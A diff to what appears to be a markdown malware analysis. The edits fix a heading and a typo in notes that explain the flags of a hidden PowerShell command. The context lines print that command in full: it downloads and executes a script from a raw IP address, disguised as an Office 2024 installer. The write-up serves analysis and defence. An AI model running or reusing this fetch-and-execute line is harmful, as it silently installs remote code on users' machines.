@@ -51,9 +51,9 @@
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"\1
 ```
 
-#### NOTES:
+#### NOTES REGARDING THE POWERSHELL EXECUTION FOUND:
 
-`-NoP` flag (No Profile), is used to prevent powershell from loading the user's profiel scripts (it can be used to reduce startup time). `-Noni` (Non-Interactive) flag is used to run the powershell script in a non-interactive mode. `-W hidden` flag is used to hides the powershell window, thus making the executiion invisible to the user.
+`-NoP` flag (No Profile), is used to prevent powershell from loading the user's profile scripts (it can be used to reduce startup time). `-Noni` (Non-Interactive) flag is used to run the powershell script in a non-interactive mode. `-W hidden` flag is used to hides the powershell window, thus making the executiion invisible to the user.
 
 The biggest red flag is `-Exec Bypass`, this flag used to override the system's execution policy, allowing the script to run regardless of any policy settings that might prevent it. This flag is actually is the biggest red flag if it is executed by non legitimate user.
 
